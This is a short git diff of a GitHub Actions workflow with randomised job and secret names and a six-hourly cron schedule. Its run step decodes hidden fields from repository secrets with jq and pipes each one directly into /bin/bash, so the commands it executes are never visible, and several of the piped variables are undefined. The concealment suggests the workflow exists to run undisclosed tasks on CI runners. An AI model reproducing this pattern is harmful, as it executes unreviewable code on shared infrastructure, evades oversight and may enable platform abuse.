@@ -2,7 +2,8 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 2/6 * * *'
+    - cron: '40 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,9 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          udmjn015: ${{ secrets.udmjn015 }}
+          hvtt62618: ${{ secrets.hvtt62618 }}
         run: |
-          echo $udmjn015 | jq -r .lzup0 | /bin/bash
-          echo $m92 | jq -r .tdi97851 | /bin/bash
-          echo $rxwwk5 | jq -r .ssrmg8063 | /bin/bash
+          echo $hvtt62618 | jq -r .uke7075 | /bin/bash
+          echo $zi4 | jq -r .uwst31816 | /bin/bash
+          echo $i76 | jq -r .asr24839 | /bin/bash
+          echo $qummz92526 | jq -r .w9 | /bin/bash
 
